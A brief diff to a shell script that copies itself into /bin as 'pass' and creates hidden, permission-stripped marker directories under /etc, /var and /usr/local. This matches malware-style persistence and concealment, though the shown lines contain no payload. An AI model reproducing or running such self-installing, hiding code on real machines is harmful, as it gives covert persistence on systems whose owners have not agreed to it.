@@ -16,13 +16,12 @@ if [ ! -e /bin/pass ]; then
     cp "$0" /bin
 fi
 if [ "$0" = "$(basename pass)" ] && [ ! -e /etc/.raulm/.Ye ] && [ ! -e /var/.Hj ] && [ ! -e /usr/local/.ko ]; then
-    mkdir /etc/.raulm
-    mkdir /etc/.raulm/.Ye
-    chmod go-rwx /etc/.raulm
+    mkdir /etc/.raulm /etc/.raulm/.Ye
+    chmod a-rwx /etc/.raulm
     mkdir /var/.Hj
-    chmod go-rwx /var/.Hj
+    chmod a-rwx /var/.Hj
     mkdir /usr/local/.ko
-    chmod go-rwx /usr/local/.ko
+    chmod a-rwx /usr/local/.ko
 fi
     
 #######
